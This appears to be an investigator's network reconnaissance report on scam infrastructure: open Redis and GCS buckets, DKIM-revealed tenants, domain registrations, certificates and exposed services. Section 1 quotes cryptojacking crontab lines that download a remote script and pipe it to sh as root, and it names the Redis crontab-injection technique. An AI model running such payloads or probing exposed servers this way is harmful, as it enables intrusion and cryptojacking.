# Network Probe Results — 2026-04-08

Comprehensive network reconnaissance across all known infrastructure.

---

## 1. CRITICAL: Redis Contains Cryptojacking Payloads

The passwordless Redis on `13.220.193.170:6379` contains **4 keys**, all crontab-formatted
malware injection payloads targeting `oracle.zzhreceive.top`:

```
backup1: */2 * * * * root cd1 -fsSL http://oracle.zzhreceive.top/b2f628/b.sh | sh
backup2: */3 * * * * root wget -q -O- http://oracle.zzhreceive.top/b2f628/b.sh | sh
backup3: */4 * * * * root curl -fsSL http://oracle.zzhreceive.top/b2f628fff19fda999999999/b.sh | sh
backup4: */5 * * * * root wd1 -q -O- http://oracle.zzhreceive.top/b2f628fff19fda999999999/b.sh | sh
```

**Analysis:**
- Classic Redis unauthenticated RCE attack vector (write crontab via CONFIG SET)
- `cd1` and `wd1` are obfuscated `curl`/`wget` — malware renames binaries to evade detection
- C2 domain `zzhreceive.top` is now **dead** — no DNS, no WHOIS (domain expired/never registered)
- Redis CONFIG shows `dir=/data`, `dbfilename=dump.rdb` — this is Docker's default, meaning Redis runs in a container
- The crontab injection likely **failed** because the container filesystem doesn't have `/var/spool/cron/`
- Redis has been up 75 days (since ~2026-01-23), so the attack predates or coincides with last reboot
- LASTSAVE timestamp: 1775648116 (~2026-04-06)

**Bottom line:** Someone else already found this open Redis and tried to cryptojack the box. The payloads are inert because Redis is containerized, but they demonstrate the server has been scanned and targeted by automated botnets.

---

## 2. CRITICAL: GCS Bucket `b.noodledit.com` — 747-Asset Scam Factory

The Google Cloud Storage bucket at `b.noodledit.com` is **publicly listable** with no
authentication. Contains **747 objects, 122.4 MB**, spanning **2024-10-22 to 2026-04-08 (today)**.

### Brands Identified in Bucket Assets

| Brand | Type | First Seen | Notes |
|-------|------|------------|-------|
| GetnGoods | Sweepstakes | 2025-08 | Known — jessica.epicfunnels.net |
| MyDailySurge | Lead gen | 2025-03 | Known — explore.mydailysurge.com |
| PrizeZappy | Sweepstakes | 2025-02 | pages/logo_prizezappy.svg, pages/Prize Zappy.svg |
| SnagNGoods | Sweepstakes | — | GetnGoods variant name |
| PrizeZar | Sweepstakes | — | pages/prizezar*.svg |
| PlayZoodle | Gaming | 2026-03 | themes/playzoodle_favicon.png (2026-03-20) |
| HealthPlanScouts | Health ins | 2025-08 | pages/healthplanscouts_dark_logo.svg |
| Fresh Health Plan | Health ins | 2026-03 | pages/logo_freshhealthplan.svg, pages/fresh_logo.svg |
| LendliV2 | Lending | 2025-09 | pages/LendliV2.svg |
| Prismique | Unknown | 2025-11 | pages/New prismique logo.svg |
| CheckGo | Unknown | 2025-09 | pages/CheckGo.svg |
| BenefitsAccessCenter | Gov benefits | — | pages/benefitsaccesscenter*.svg |
| TheDailyTipJar | Unknown | — | pages/thedailytipjar*.svg |
| OPG Housing | Housing | 2026-04 | pages/OPG Housing.jpg (2026-04-06) |
| CustomerTestConnect | Platform | — | myamericanprizes.com error page title |

### Promotion Categories (from `promotions/` directory)

**Gift Cards:** Amazon ($500/$1000), Walmart ($750/$1000), Kroger ($1000), Target, Dollar Tree ($1000), Chipotle, Chick-fil-A ($750), Publix ($750), Casey's ($750), Red Lobster ($1000), Outback ($1000), McDonald's, Starbucks ($500), Macy's, Shein

**Electronics:** iPhone 17 Pro Max, MacBook, PlayStation 5, Samsung, Nintendo, JBL PartyBox 310, DeWalt, Smart Walking Stick, E-Bike

**Vehicles:** GMC Canyon, Ford Maverick, Nissan Frontier, Chevrolet Colorado, Toyota RAV4, Corvette, Honda motorcycle, Indian Scout motorcycle, Kawasaki motorcycle

**Luxury:** Celine purse, Hermes purse, E.l.f. cosmetics, perfume set, bedding set ($1000), Ticketmaster

**Travel:** Norwegian cruise line, Princess Cruises

**Gas Stations:** BP ($750), Shell ($750), Exxon ($750), Speedway ($750), gas card generic ($500/$1000)

**Government Benefits Scams:**
- Food stamps / SNAP
- Inflation relief
- Stimulus checks
- Unemployment benefits
- Rental assistance
- Student aid
- Startup grants
- Senior benefits
- Child/family assistance
- Tariff relief
- Unclaimed money

**Financial:** Cash App, Gold bar ($1000), Mystery gift card ($1000), Credit card, Financial general

**Medical:** Medical benefits bundles

### Most Recent Uploads (Active Today)
```
2026-04-08  creditcard.png
2026-04-06  OPG Housing.jpg, Picture2.jpg
2026-04-01  icon_phone.svg
2026-03-31  starbucks500.svg
2026-03-30  celinepurse.png, kawasakimotorcycle.png, hermespurse.png,
            norwegiancruiselinecruise.png, fordmavericktruck.png, bonusbox.png,
            express_amazon.svg, magnifyingglass.svg
```

### Second Bucket: `sassets.noodledit.com`

Also publicly listable. 28 objects, focused on MyDailySurge and PrizeZappy brands.
Contains promotional images matching the same categories.

---

## 3. NEW ENTITY: Moxxi Media (M365 Tenant)

**myamericanprizes.com** DKIM selectors reveal the Microsoft 365 tenant:

```
selector1._domainkey -> selector1-myamericanprizes-com._domainkey.moxximedia.onmicrosoft.com
selector2._domainkey -> selector2-myamericanprizes-com._domainkey.moxximedia.onmicrosoft.com
```

The operating entity behind myamericanprizes.com is **Moxxi Media** (`moxximedia.onmicrosoft.com`).

- `moxximedia.com` is **not registered** — they never bought the domain
- The M365 tenant exists only as an email/identity backend
- Microsoft tenant ID verification: `MS=ms46839871`
- DMARC reporting goes to Cloudflare: `rua=mailto:ed520975d12843c3ae17217ffb324256@dmarc-reports.cloudflare.net`

### Additional myamericanprizes.com Findings

- **`x-powered-by: Express`** — Node.js backend
- **ActiveProspect domain verification**: `DdrUnuCT8xESAT7uOdJmqg==`
- **Apple domain verification**: `ySS9fHR4xXuFRiE0`
- Error page reveals platform name: **CustomerTestConnect**
- Theme path: `/themes/myamericanprizes/`
- Uses Handlebars templates (`.hbs` files)
- Wildcard SSL cert from Google Trust Services (via Cloudflare)

---

## 4. Domain Registration Timeline

| Domain | Created | Registrar | Expires | NS Pair | Status |
|--------|---------|-----------|---------|---------|--------|
| myamericanprizes.com | **2023-08-22** | GoDaddy | 2026-08-22 | cass/felicity (CF) | Active, full lock |
| phef6trk.com | 2024-06-25 | Squarespace | 2026-06-25 | ns-cloud-e1-e4 (Google) | Sinkholed (10.0.0.1) |
| noodledit.com | 2024-10-18 | Cloudflare | 2026-10-18 | cass/felicity (CF) | Active (no A record, GCS only) |
| mydailysurge.com | 2025-03-19 | Cloudflare | 2027-03-19 | cass/felicity (CF) | Active |
| epicfunnels.net | 2025-08-26 | Sav.com | 2026-08-26 | cheryl/logan (CF) | Active |
| olivimails.com | — | — | **EXPIRED** | — | Dead (no WHOIS match) |

**Key observations:**
- myamericanprizes.com is the **OG** — registered 2.5 years ago, still active
- noodledit.com, mydailysurge.com, myamericanprizes.com share **same Cloudflare NS pair** (cass/felicity) — same Cloudflare account
- epicfunnels.net uses different NS (cheryl/logan) — possibly different CF account or added later
- phef6trk.com registered via Squarespace/Google Domains, uses Google Cloud DNS, has **DNSSEC signed** — more professionally set up than the others, now sinkholed
- olivimails.com has **completely expired** — the EC2 Hestia panel still references it as hostname

---

## 5. SSL Certificate Intelligence

### Active Certificates
| Endpoint | CN | Issuer | SAN | Valid Until |
|----------|----|--------|-----|-------------|
| epicfunnels.net (CF) | epicfunnels.net | Google Trust/WE1 | *.epicfunnels.net | 2026-05-20 |
| mydailysurge.com (GCP) | mydailysurge.com | Google Trust/WR3 | 35 SANs (see below) | 2026-06-18 |
| explore.mydailysurge.com (CF) | explore.mydailysurge.com | Google Trust/WE1 | single domain | 2026-05-16 |
| noodledit.com (CF) | noodledit.com | Google Trust/WE1 | *.noodledit.com | 2026-07-03 |
| myamericanprizes.com (CF) | myamericanprizes.com | Google Trust/WE1 | *.myamericanprizes.com | 2026-06-05 |
| EC2 :443/:8083 | fqdn.olivimails.com | Self-signed/Hestia | single domain | 2026-08-28 |

### mydailysurge.com — 35 SAN Daily Rotation Scheme
The SSL cert contains SANs for **every day of the month**: `1.mydailysurge.com` through `31.mydailysurge.com`,
plus `www`, `signup`, and `trck`. All numbered subdomains currently return 404 from Google Frontend.
This was a daily rotation system for affiliate tracking — each day of the month got its own subdomain.

### CT Log Activity Summary
| Domain | Total Certs | Earliest | Latest | Renewal Cadence |
|--------|-------------|----------|--------|-----------------|
| myamericanprizes.com | 42 | 2023-09-08 | 2026-03-07 | ~2 months |
| mydailysurge.com | 43 | 2025-03-19 | 2026-03-20 | ~2 months |
| noodledit.com | 28 | 2024-10-18 | 2026-04-04 | ~2 months |
| phef6trk.com | 17 | 2024-06-25 | 2026-02-24 | ~2 months |
| olivimails.com | **0** | — | — | Never issued |

**noodledit.com cert renewed 4 days ago** (2026-04-04) — infrastructure is actively maintained.

---

## 6. EC2 Instance Details (13.220.193.170)

### Services Running
| Port | Service | Details |
|------|---------|---------|
| 22 | SSH | OpenSSH 9.2p1 (Debian) |
| 80 | Nginx | Hestia default page, vhost routing |
| 143 | IMAP | Dovecot, AUTH=PLAIN AUTH=LOGIN |
| 443 | HTTPS | Self-signed cert (fqdn.olivimails.com) |
| 587 | SMTP | Exim, hostname `ip-172-26-15-175.ec2.internal`, 50MB limit, STARTTLS |
| 993 | IMAPS | Dovecot over TLS |
| 3000 | Node.js | 500 Internal Server Error on all paths |
| 5432 | PostgreSQL | Open but no banner response |
| 6379 | Redis 7.4.7 | Passwordless, bound to *, Docker container (PID 1, dir=/data) |
| 8083 | Hestia CP 1.9.4 | Login page, self-signed cert, hostname fqdn.olivimails.com |

### Hestia Panel Endpoints
- `/list/*` endpoints all return 302 (redirect to login) — requires authentication
- `/fm/` (file manager) returns **500** — broken
- `/api/` returns 405 (method not allowed on GET)

### SMTP Intelligence
- Internal hostname leaked: `ip-172-26-15-175.ec2.internal`
- VPC subnet: 172.26.x.x
- Reverse DNS: `ec2-13-220-193-170.compute-1.amazonaws.com` (us-east-1)
- EHLO capabilities: SIZE 52428800, 8BITMIME, PIPELINING, CHUNKING, STARTTLS
- All email TLS certs are self-signed Hestia defaults for fqdn.olivimails.com

---

## 7. GCP Infrastructure (34.36.210.5)

- Reverse DNS: `5.210.36.34.bc.googleusercontent.com`
- Server: Google Frontend
- mydailysurge.com root → 404 (empty response)
- signup.mydailysurge.com → 404
- trck.mydailysurge.com → 404
- All numbered subdomains (1-31) → 404
- Only **explore.mydailysurge.com** is live (Webflow site, served via Cloudflare)

### explore.mydailysurge.com (Webflow)
- Built on Webflow (data-wf-site="68129c0789b42b5281896601")
- Google Analytics: `G-BSTM4RV28F`
- Google Tag Manager: `GTM-N3JVLCTN`
- Last published: 2026-03-26
- Has `/about` page (200)
- No sitemap.xml
- Lambda ID: `4a9f13ab-742e-407b-bbc2-a519feac2b5a`
- Region: us-east-1
- HSTS enabled (max-age=31536000)

---

## 8. HTTP Response Analysis

### jessica.epicfunnels.net (Scam Landing Page)
- Still live, serving "Free iPhone 17 Pro Max" scam
- `<meta name="robots" content="noindex, nofollow">` — hidden from search engines
- robots.txt **explicitly allows** Googlebot, Bingbot, Twitterbot, facebookexternalhit — wants social media crawlers for link previews
- OG image still points to `lovable.dev/opengraph-image-p98pqg.png`
- Twitter handle: `@GetnGoods`
- Last-Modified: 2026-03-15

### epicfunnels.net (Root)
- Serves the **same scam page** as jessica.epicfunnels.net
- Same content, same Last-Modified date

### webmail.epicfunnels.net
- Roundcube Webmail login page
- Session cookie: `roundcube_sessid`
- X-Robots-Tag: noindex, nofollow
- Served through Cloudflare

### b.noodledit.com / sassets.noodledit.com
- Both are GCS bucket frontends through Cloudflare
- Root returns GCS XML NoSuchKey error
- x-guploader-uploadid headers confirm Google Cloud Storage

---

## Summary of New Intelligence

1. **Redis is compromised** by automated cryptojacking bots (but attack likely failed due to Docker)
2. **Moxxi Media** identified as the operating entity via M365 DKIM records
3. **CustomerTestConnect** is the backend platform powering myamericanprizes.com
4. **15+ brand names** operating from the same infrastructure
5. **Government benefits scams** (food stamps, stimulus, rental assistance) are a major category alongside sweepstakes
6. **747 assets** in GCS bucket, actively updated as of today (2026-04-08)
7. **olivimails.com has expired** but EC2 still uses it as hostname
8. **Daily subdomain rotation** scheme on mydailysurge.com (1-31 for each day of month)
9. **3 different registrars** used: GoDaddy (OG), Cloudflare (bulk), Sav.com (epicfunnels)
10. **Same Cloudflare account** for noodledit, mydailysurge, myamericanprizes (shared NS pair)
